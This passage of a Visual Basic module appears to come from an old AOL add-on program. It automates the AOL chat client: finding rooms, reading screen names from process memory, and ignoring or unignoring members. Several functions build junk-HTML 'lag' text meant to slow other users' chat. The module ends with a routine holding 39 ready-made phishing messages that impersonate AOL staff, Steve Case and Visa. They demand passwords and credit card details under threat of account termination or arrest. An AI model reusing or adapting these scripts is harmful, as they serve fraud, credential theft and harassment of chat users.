        RoomTitle$ = getcaption(FindRoom&)
        RoomTitle$ = LCase(RePlacestRing(room$, " ", ""))
        FullWindow& = FindWindow("#32770", "America Online")
        FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
    Loop Until (FullWindow& <> 0& And FullButton& <> 0&) Or room$ = RoomTitle$
    DoEvents
    If FullWindow& <> 0& Then
        Do
            DoEvents
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYDOWN, VK_SPACE, 0&)
            Call SendMessage(FullButton&, WM_KEYUP, VK_SPACE, 0&)
            FullWindow& = FindWindow("#32770", "America Online")
            FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
        Loop Until FullWindow& = 0& And FullButton& = 0&
    End If
    DoEvents
End Sub

Public Function FindInfoWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim AOLCheck As Long, AolIcon As Long, AolStatic As Long
    Dim AolIcon2 As Long, AOLGlyph As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
    AolStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
    AolIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AolIcon2& = FindWindowEx(child&, AolIcon&, "_AOL_Icon", vbNullString)
    If AOLCheck& <> 0& And AolStatic& <> 0& And AOLGlyph& <> 0& And AolIcon& <> 0& And AolIcon2& <> 0& Then
        FindInfoWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            AOLCheck& = FindWindowEx(child&, 0&, "_AOL_Checkbox", vbNullString)
            AolStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            AOLGlyph& = FindWindowEx(child&, 0&, "_AOL_Glyph", vbNullString)
            AolIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AolIcon2& = FindWindowEx(child&, AolIcon&, "_AOL_Icon", vbNullString)
            If AOLCheck& <> 0& And AolStatic& <> 0& And AOLGlyph& <> 0& And AolIcon& <> 0& And AolIcon2& <> 0& Then
                FindInfoWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindInfoWindow& = child&
End Function


Public Sub CloseWindow(window As Long)
    Call PostMessage(window&, WM_CLOSE, 0&, 0&)
End Sub

Public Sub Form_Drag(theForm As Form)
    Call ReleaseCapture
    Call SendMessage(theForm.hwnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub
Public Function RePlacestRing(MyString, ToFind, ReplaceWith) As String
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString, NewSpot& - 1)
            If Spot& + Len(ToFind) <= Len(MyString) Then
                RightString$ = Right(MyString, Len(MyString) - NewSpot& - Len(ToFind) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith & RightString$
            MyString = NewString$
        Else
            NewString$ = MyString
        End If
        Spot& = NewSpot& + Len(ReplaceWith)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString), LCase(ToFind))
        End If
    Loop Until NewSpot& < 1
    RePlacestRing$ = NewString$
End Function
Public Function ReverseString(MyString As String) As String
    Dim TempString As String, StringLength As Long
    Dim Count As Long, NextChr As String, NewString As String
    TempString$ = MyString$
    StringLength& = Len(TempString$)
    Do While Count& <= StringLength&
        Count& = Count& + 1
        NextChr$ = Mid$(TempString$, Count&, 1)
        NewString$ = NextChr$ & NewString$
    Loop
    ReverseString$ = NewString$
End Function
Public Function SwitchStrings(MyString As String, String1 As String, String2 As String) As String
    Dim TempString As String, Spot1 As Long, Spot2 As Long
    Dim Spot As Long, ToFind As String, ReplaceWith As String
    Dim NewSpot As Long, LeftString As String, RightString As String
    Dim NewString As String
    If Len(String2) > Len(String1) Then
        TempString$ = String1$
        String1$ = String2$
        String2$ = TempString$
    End If
    Spot1& = InStr(MyString$, String1$)
    Spot2& = InStr(MyString$, String2$)
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    If Spot1& < Spot2& Or Spot2& = 0 Or Len(String1$) = Len(String2$) Then
        If Spot1& > 0 Then
            Spot& = Spot1&
            ToFind$ = String1$
            ReplaceWith$ = String2$
        End If
    End If
    If Spot2& < Spot1& Or Spot1& = 0& Then
        If Spot2& > 0& Then
            Spot& = Spot2&
            ToFind$ = String2$
            ReplaceWith$ = String1$
        End If
    End If
    If Spot1& = 0& And Spot2& = 0& Then
        SwitchStrings$ = MyString$
        Exit Function
    End If
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString$ = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot + Len(ReplaceWith$) - Len(ToFind$) + 1
        If Spot& <> 0& Then
            Spot1& = InStr(Spot&, MyString$, String1$)
            Spot2& = InStr(Spot&, MyString$, String2$)
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            SwitchStrings$ = MyString$
            Exit Function
        End If
        If Spot1& < Spot2& Or Spot2& = 0& Or Len(String1$) = Len(String2$) Then
            If Spot1& > 0& Then
                Spot& = Spot1&
                ToFind$ = String1$
                ReplaceWith$ = String2$
            End If
        End If
        If Spot2& < Spot1& Or Spot1& = 0& Then
            If Spot2& > 0& Then
                Spot& = Spot2&
                ToFind$ = String2$
                ReplaceWith$ = String1$
            End If
        End If
        If Spot1& = 0& And Spot2& = 0& Then
            Spot& = 0&
        End If
        If Spot& > 0& Then
            NewSpot& = InStr(Spot&, MyString$, ToFind$)
        Else
            NewSpot& = Spot&
        End If
    Loop Until NewSpot& < 1&
    SwitchStrings$ = NewString$
End Function


Public Function roomcount() As Long
    Dim AOL As Long, MDI As Long, rMail As Long, rlist As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindRoom
    rlist& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(rlist&, LB_GETCOUNT, 0&, 0&)
    roomcount& = Count&
End Function

Public Function FindRoom() As Long
'ouwop
'aol2/4/5
'If AOL25_FindroOm Then FindRoom& = 1: Exit Function

    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich As Long, AOLList As Long
    Dim AolIcon As Long, AolStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
    AolIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    AolStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
    If Rich& <> 0& And AOLList& <> 0& And AolIcon& <> 0& And AolStatic& <> 0& Then
        FindRoom& = child&
        If AOL50_FindRoom Then FindRoom& = child&: Exit Function

        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
           Rich& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            AOLList& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
            AolIcon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
            AolStatic& = FindWindowEx(child&, 0&, "_AOL_Static", vbNullString)
            If Rich& <> 0& And AOLList& <> 0& And AolIcon& <> 0& And AolStatic& <> 0& Then
                FindRoom& = child&
                  If AOL50_FindRoom Then FindRoom& = child&: Exit Function

                Exit Function
            End If
        Loop Until child& = 0&
    End If

    FindRoom& = child&
End Function


 Sub chatignorebyindex(Combo, Index As Long)
    Dim room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, a As Long, Count As Long
    Count& = roomcount&
    If Index& > Count& - 1 Then Exit Sub
    room& = FindRoom&
    sList& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 0&, 0&)
    Do
    DoEvents
    iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    
    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
  
          
      
 TimeOut (0.5)
 a& = SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
 If a& = 1 Then
 MsgBox "Person iz Already being Ignored!", vbCritical, "ERROR!"
 TimeOut (0.2)
 Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
 TimeOut (0.2)
 Else
 cLickiCoN (iCheck&)
 TimeOut (0.5)
 Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
 

If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (1)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ("•,¸,.·´<B>[X]</b>ed Chat <U>i</u>gnored <I>" + Combo + "</i>`·.,¸,•")
End If
  
End Sub
 Sub chatunignorebyindex(Combo, Index As Long)
    Dim room As Long, sList As Long, iWindow As Long
    Dim iCheck As Long, a As Long, Count As Long
    Count& = roomcount&
    If Index& > Count& - 1 Then Exit Sub
    room& = FindRoom&
    sList& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    Call SendMessage(sList&, LB_SETCURSEL, Index&, 0&)
    Call PostMessage(sList&, WM_LBUTTONDBLCLK, 1&, 1&)
    Do
    DoEvents
    iWindow& = FindInfoWindow
    Loop Until iWindow& <> 0&
    
    DoEvents

    iCheck& = FindWindowEx(iWindow&, 0&, "_AOL_Checkbox", vbNullString)
    DoEvents
    
TimeOut (0.5)
a& = SendMessage(iCheck&, BM_GETCHECK, 1&, 1&)
If a& = 0 Then
MsgBox "Person iz Not Ignored!", vbCritical, "ERROR!"
TimeOut (0.4)
Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
TimeOut (0.5)
Else
cLickiCoN (iCheck&)
TimeOut (0.5)
Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then TimeOut (1)
If INI_GeT("Settingz", "adv", App.Path + "\uzer.ini") = "yez" Then sendchat ("•,¸,.·´<B>[U]</b>ed Chat <U>Un</u>ignored <I>" + Combo + "</i>`·.,¸,•")
End If
  

End Sub

Sub chatignorebyname(Combo, name As String)
'i took dis outta dos32.bas, but i edited it to work better.!
'[ouwop]
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, screenname As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim rlist As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    room& = FindRoom&
    If room& = 0& Then Exit Sub
    rlist& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rlist, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
    For Index& = 0 To SendMessage(rlist, LB_GETCOUNT, 0, 0) - 1
        screenname$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rlist, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, screenname$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal screenname$, 4)
            psnHold& = psnHold& + 6
            screenname$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, screenname$, Len(screenname$), rBytes&)
            screenname$ = Left$(screenname$, InStr(screenname$, vbNullChar) - 1)
           If screenname$ <> getuser$ And LCase(screenname$) = LCase(name$) Then
                        lIndex& = Index&
                 Call chatignorebyindex(Combo, lIndex&)
 Exit Sub
duNN:
            End If
        Next Index&
       Call CloseHandle(mThread)
    End If
End Sub
 Sub chatunignorebyname(Combo, name As String)
'i took dis outta dos32.bas, but i edited it to work better.
'[ouwop]
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, screenname As String
    Dim psnHold As Long, rBytes As Long, Index As Long, room As Long
    Dim rlist As Long, sThread As Long, mThread As Long
    Dim lIndex As Long
    room& = FindRoom&
    If room& = 0& Then Exit Sub
    rlist& = FindWindowEx(room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rlist, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
    For Index& = 0 To SendMessage(rlist, LB_GETCOUNT, 1, 1) + 1
         screenname$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rlist, LB_GETITEMDATA, ByVal CLng(Index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, screenname$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal screenname$, 4)
            psnHold& = psnHold& + 6
            screenname$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, screenname$, Len(screenname$), rBytes&)
            screenname$ = Left$(screenname$, InStr(screenname$, vbNullChar) - 1)
            If screenname$ <> getuser$ And LCase(screenname$) = LCase(name$) Then
                             lIndex& = Index&
                 Call chatunignorebyindex(Combo, lIndex&)
                  DoEvents
Exit Sub
        End If
    Next Index&
     Call CloseHandle(mThread)
    End If
End Sub




Function Chat_Lag2(TheText As String)
'dis makez a lagg do random colorz
g$ = TheText$
a = Len(g$)
For w = 1 To a Step 3
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)

    Dim Dice
    Randomize
    Dice = Int(10 * Rnd + 1)
 If Dice = 1 Then Col$ = "#0000ff"
 If Dice = 2 Then Col$ = "#66cc00"
 If Dice = 3 Then Col$ = "#ff0000"
 If Dice = 4 Then Col$ = "#880000"
 If Dice = 5 Then Col$ = "#444444"
 If Dice = 6 Then Col$ = "#cc0066"
 If Dice = 7 Then Col$ = "#888888"
 If Dice = 8 Then Col$ = "#cc9900"
 If Dice = 9 Then Col$ = "#000088"
If Dice = 10 Then Col$ = "#ff0033"


    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html><pre><html><b>" & r$ & "<b></html></html></pre><b>" & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><b>" & u$ & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html><b>" & s$ & "</html></pre>"
Next w
Chat_Lag2 = p$
End Function
Function Chat_RC(TheText)
'dis makez random colorz
g$ = TheText
a = Len(g$)
For w = 1 To a Step 3
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)

    Dim Dice
    Randomize
    Dice = Int(10 * Rnd + 1)
 If Dice = 1 Then Col$ = "#0000ff"
 If Dice = 2 Then Col$ = "#66cc00"
 If Dice = 3 Then Col$ = "#ff0000"
 If Dice = 4 Then Col$ = "#880000"
 If Dice = 5 Then Col$ = "#444444"
 If Dice = 6 Then Col$ = "#cc0066"
 If Dice = 7 Then Col$ = "#888888"
 If Dice = 8 Then Col$ = "#cc9900"
 If Dice = 9 Then Col$ = "#000088"
If Dice = 10 Then Col$ = "#ff0033"


    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><b>" & r$ & "<b>" & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><b>" & u$ & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><b>" & s$ & ""
Next w
Chat_RC = p$

End Function

Function Chat_Lag5(TheText As String)
'dis makez a lagg do random colorz
'WAVY
g$ = TheText$
a = Len(g$)
For w = 1 To a Step 3
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)

    Dim Dice
    Randomize
    Dice = Int(10 * Rnd + 1)
 If Dice = 1 Then Col$ = "#0000ff"
 If Dice = 2 Then Col$ = "#66cc00"
 If Dice = 3 Then Col$ = "#ff0000"
 If Dice = 4 Then Col$ = "#880000"
 If Dice = 5 Then Col$ = "#444444"
 If Dice = 6 Then Col$ = "#cc0066"
 If Dice = 7 Then Col$ = "#888888"
 If Dice = 8 Then Col$ = "#cc9900"
 If Dice = 9 Then Col$ = "#000088"
If Dice = 10 Then Col$ = "#ff0033"


    p$ = p$ & "<b><SUP><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html></html><html><pre><html><b><SUP>" & r$ & "<SUP><B></html><html></html></html></pre><b>" & "<SUP><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "></SUP><b>" & u$ & "</SUP><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><SUP><pre><html></html><html><b>" & s$ & "<html></html></html></SUP></pre>"
Next w
Chat_Lag5 = p$
End Function

Function Chat_Lag3(TheText As String)
'dis makez a lagg do random colorz
g$ = TheText$
a = Len(g$)
For w = 1 To a Step 3
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)

    Dim Dice
    Randomize
    Dice = Int(10 * Rnd + 1)
 If Dice = 1 Then Col$ = "#0000ff"
 If Dice = 2 Then Col$ = "#66cc00"
 If Dice = 3 Then Col$ = "#ff0000"
 If Dice = 4 Then Col$ = "#880000"
 If Dice = 5 Then Col$ = "#444444"
 If Dice = 6 Then Col$ = "#cc0066"
 If Dice = 7 Then Col$ = "#888888"
 If Dice = 8 Then Col$ = "#cc9900"
 If Dice = 9 Then Col$ = "#000088"
If Dice = 10 Then Col$ = "#ff0033"


    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html></html><html></html><pre><html><b>" & r$ & "<b></html></html></pre><html></html><b>" & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><b>" & u$ & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html></html><html></html><html><b>" & s$ & "</html><html></html></pre>"
Next w
Chat_Lag3 = p$
End Function
Function Chat_Lag4(TheText As String)
'dis makez a lagg do random colorz
'Underlined!!!!
g$ = TheText$
a = Len(g$)
For w = 1 To a Step 3
    r$ = Mid$(g$, w, 1)
    u$ = Mid$(g$, w + 1, 1)
    s$ = Mid$(g$, w + 2, 1)

    Dim Dice
    Randomize
    Dice = Int(10 * Rnd + 1)
 If Dice = 1 Then Col$ = "#0000ff"
 If Dice = 2 Then Col$ = "#66cc00"
 If Dice = 3 Then Col$ = "#ff0000"
 If Dice = 4 Then Col$ = "#880000"
 If Dice = 5 Then Col$ = "#444444"
 If Dice = 6 Then Col$ = "#cc0066"
 If Dice = 7 Then Col$ = "#888888"
 If Dice = 8 Then Col$ = "#cc9900"
 If Dice = 9 Then Col$ = "#000088"
If Dice = 10 Then Col$ = "#ff0033"


    p$ = p$ & "<U><b><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><pre><html></html><html></html><pre><html><b><U>" & r$ & "<b><U></html></html></pre><html></html><b><U>" & "<FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><b><U>" & u$ & "<U><FONT COLOR=" & Chr$(34) & Col$ & Chr$(34) & "><U><pre><html></html><html></html><html><b>" & s$ & "<U></html><html></html></pre>"
Next w
Chat_Lag4 = p$
End Function





Sub PhishPhrases(phraZes As TextBox, txt As TextBox)
'diz wuz form sum bas file, but i changed it to
'werk better


'lbl.Caption = "Phraze # " + Phrazes + "-86"
If phraZes = "1" Then txt = "Hi, I'm with AOL's Online Security. We have found hackers trying to get into your MailBox. Please verify your password immediately to avoid account termination.     Thank you.                                    AOL Staff"
If phraZes = "2" Then txt = "Hello. I am with AOL's billing department. Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. Thank you, and continue to enjoy America Online."
If phraZes = "3" Then txt = "Good Evening. I am with AOL's Virus Protection Group. Due to some evidence of virus uploading, I must validate your sign-on password. Please STOP what you're doing and Tell me your password.       -- AOL VPG"
If phraZes = "4" Then txt = "Hello, I am the Head Of AOL's XPI Link Department. Due to a configuration error in your version of AOL, I need you to verify your log-on password to me, to prevent account suspension and possible termination.  Thank You."
If phraZes = "5" Then txt = "Hi. You are speaking with AOL's billing manager, Steve Case. Due to a virus in one of our servers, I am required to validate your password. You will be awarded an extra 10 FREE hours of air-time for the inconvenience."
If phraZes = "6" Then txt = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
If phraZes = "7" Then txt = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
If phraZes = "8" Then txt = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
If phraZes = "9" Then txt = "Hi, I'm Alex Troph of America Online Sevice Department. Your online account, #3560028, is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
If phraZes = "10" Then txt = "Hello, I am a representative of the VISA Corp.  Due to a computer error, we are unable complete your membership to America Online. In order to correct this problem, we ask that you hit the `Respond` key, and reply with your full name and password, so that the proper changes can be made to avoid cancellation of your account. Thank you for your time and cooperation.  :-)"
If phraZes = "11" Then txt = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
If phraZes = "12" Then txt = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Telephone#, Visa Card#, and Expiration date. If this information is not processed promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
If phraZes = "13" Then txt = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that your validation process is almost complete.  To complete your validation process I need you to please hit the `Respond` key and reply with the following information: Name, Address, Phone Number, City, State, Zip Code,  Credit Card Number, Expiration Date, and Bank Name.  Thank you for your time and cooperation and we hope that you enjoy America Online. :-)"
If phraZes = "14" Then txt = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
If phraZes = "15" Then txt = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
If phraZes = "16" Then txt = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
If phraZes = "17" Then txt = "Sorry, there seems to be a problem with your bill. Please reply with your password to verify that you are the account holder.  Thank you."
If phraZes = "18" Then txt = "Sorry  the credit card you entered is invalid. Perhaps you mistyped it?  Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it. Thank you and enjoy AOL."
If phraZes = "19" Then txt = "Sorry, your credit card failed authorization. Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it.  Thank you and enjoy AOL."
If phraZes = "20" Then txt = "Due to the numerous use of identical passwords of AOL members, we are now generating new passwords with our computers.  Your new password is 'Stryf331', You have the choice of the new or old password.  Click respond and try in your preferred password.  Thank you"
If phraZes = "21" Then txt = "I work for AOL's Credit Card department. My job is to check EVERY AOL account for credit accuracy.  When I got to your account, I am sorry to say, that the Credit information is now invalid. We DID have a sysem crash, which my have lost the information, please click respond and type your VALID credit card info.  Card number, names, exp date, etc, Thank you!"
If phraZes = "22" Then txt = "Hello I am with AOL Account Defense Department.  We have found that your account has been dialed from San Antonia,Texas. If you have not used it there, then someone has been using your account.  I must ask for your password so I can change it and catch him using the old one.  Thank you."
If phraZes = "23" Then txt = "Hello member, I am with the TOS department of AOL.  Due to the ever changing TOS, it has dramatically changed.  One new addition is for me, and my staff, to ask where you dialed from and your password.  This allows us to check the REAL adress, and the password to see if you have hacked AOL.  Reply in the next 1 minute, or the account WILL be invalidated, thank you."
If phraZes = "24" Then txt = "Hello member, and our accounts say that you have either enter an incorrect age, or none at all.  This is needed to verify you are at a legal age to hold an AOL account.  We will also have to ask for your log on password to further verify this fact. Respond in next 30 seconds to keep account active, thank you."
If phraZes = "25" Then txt = "Dear member, I am Greg Toranis and I werk for AOL online security. We were informed that someone with that account was trading sexually explecit material. That is completely illegal, although I presonally do not care =).  Since this is the first time this has happened, we must assume you are NOT the actual account holder, since he has never done this before. So I must request that you reply with your password and first and last name, thank you."
If phraZes = "26" Then txt = "Hello, I am Steve Case.  You know me as the creator of America Online, the world's most popular online service.  I am here today because we are under the impression that you have 'HACKED' my service.  If you have, then that account has no password.  Which leads us to the conclusion that if you cannot tell us a valid password for that account you have broken an international computer privacy law and you will be traced and arrested.  Please reply with the password to avoind police action, thank you."
If phraZes = "27" Then txt = "Dear AOL member.  I am Guide zZz, and I am currently employed by AOL.  Due to a new AOL rate, the $10 for 20 hours deal, we must ask that you reply with your log on password so we can verify the account and allow you the better monthly rate. Thank you."
If phraZes = "28" Then txt = "Hello I am CATWatch01. I witnessed you verbally assaulting an AOL member.  The account holder has never done this, so I assume you are not him.  Please reply with your log on password as proof.  Reply in next minute to keep account active."
If phraZes = "29" Then txt = "I am with AOL's Internet Snooping Department.  We watch EVERY site our AOL members visit.  You just recently visited a sexually explecit page.  According to the new TOS, we MUST imose a $10 fine for this.  I must ask you to reply with either the credit card you use to pay for AOL with, or another credit card.  If you do not, we will notify the authorities.  I am sorry."
If phraZes = "30" Then txt = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble. --AOL Security/B.A.H. Team"
If phraZes = "31" Then txt = "Dear member, I am a Service Representitive with the America Online Corporation,and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time.  --AOL Cust. Service"
If phraZes = "32" Then txt = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble.   --AOL Billing Department"
If phraZes = "33" Then txt = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password."
If phraZes = "34" Then txt = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number."
If phraZes = "35" Then txt = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password."
If phraZes = "36" Then txt = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
If phraZes = "37" Then txt = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
If phraZes = "38" Then txt = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
If phraZes = "39" Then txt = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
